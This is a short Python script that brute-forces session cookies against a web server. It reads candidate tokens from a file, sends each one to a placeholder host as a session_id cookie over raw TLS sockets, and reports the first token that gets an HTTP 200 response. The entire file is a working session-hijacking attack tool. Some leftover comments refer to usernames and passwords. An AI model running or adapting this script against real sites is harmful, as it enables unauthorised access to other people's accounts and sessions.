#!/usr/bin/env python3

import socket, itertools, sys, random, ssl

# message variables
host = "example.com"
path = "/"
cookiename = "session_id"

"""
This function sends an HTTP request to try and access a session protected page
by using the session tokens provided.
"""
def trytokens(tokens):

    # iterate through all the tokens
    for token in tokens:

        # clean up the string to remove whitespace characters
        token = token.strip()

        # Define an HTTP GET request template (yes, the indentation bothers me too)
        request = """GET {path} HTTP/1.1
Host: {host}
Cookie: {cookiename}={token}

"""

        # build the full HTTP request string
        request = request.replace("{host}", host)
        request = request.replace("{path}", path)
        request = request.replace("{cookiename}", cookiename)
        request = request.replace("{token}", token)
        request = request.replace("\n", "\r\n")  # Python uses \n but Apache expects \r\n

        # display the token being tried
        print("Trying " + token)

        # display the request string to be sent
        print(request)

        # send the HTTPS request
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        wrapped_socket = context.wrap_socket(s, server_hostname=host)
        wrapped_socket.connect((host, 443))
        wrapped_socket.send(request.encode())

        # gather the HTTPS response string from the server
        response = ""
        while True:
            # read the bytes and decode into a plain old Python string
            data = wrapped_socket.recv(2048).decode("utf-8")

            # append the packet data to the full response string
            response = response + data

            # check to see if we've reached the end of the HTML response or the start of a 302 redirect
            if (response.rstrip().endswith("</html>") or response.rstrip().startswith("HTTP/1.1 302")):
                break
            if ( len(data) < 1 ):
                break

        # close the connection
        wrapped_socket.close()
        
        # display the response string that was received
        print(response)

        # check if the credentials were correct and return them back, if they are
        if response.startswith("HTTP/1.1 200 OK"):
            return token
    
    # All possibilities exhausted and we didn't find the right username/password
    return None

"""
Main script. Tries to brute force username and password combinations.
"""
def main():

    # read in our tokens to try
    with open('tokens.txt') as f:
        tokens = f.read().splitlines()

    # send the login requests and get the result
    result = trytokens(tokens)

    # check the result (None means failure)
    if result == None:
        print("Could not find the right token")
    else:
        print("Found the correct token: " + result)


# execute this script
if __name__ == "__main__":
    main()
